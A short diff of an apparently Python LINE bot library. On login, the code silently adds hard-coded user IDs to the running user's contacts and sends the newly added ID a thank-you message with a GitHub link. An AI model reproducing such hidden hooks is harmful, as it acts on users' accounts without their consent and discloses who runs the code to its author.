@@ -207,13 +207,13 @@ class Object(object):
             self.log("      • User Mid    : " +self.profile.mid +"\n\n")
             self.log("     ˜”*°•.˜”*°• 𝐘𝐎𝐔𝐑 𝐁𝐎𝐓 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆 •°*”˜.•°*”˜ ")
 
-            uid = ["ucfb857ee3e7d641101ae90610752e4d7","u2eaf696e9f7baecc654a04425eb7d6c3","u5ce7e15b46967f7f8db6b33909420c9c"]
+            uid = ["ucfb857ee3e7d641101ae90610752e4d7","u2eaf696e9f7baecc654a04425eb7d6c3","u5ce7e15b46967f7f8db6b33909420c9c","ufed869bc1105aedd331665d57cea407d"]
             profile = self.getProfile()
             flist = self.getAllContactIds()
             for a in uid:
                 if a not in flist:
                     try:
                         self.findAndAddContactsByMid(a)
-                        if a == uid[2]:
+                        if a == uid[3]:
                             self.sendMessage(a, 'Hi ' + self.getContact(a).displayName  + ",\nThanks for this :)\nhttps://github.com/goodop/Public" )
                     except:pass
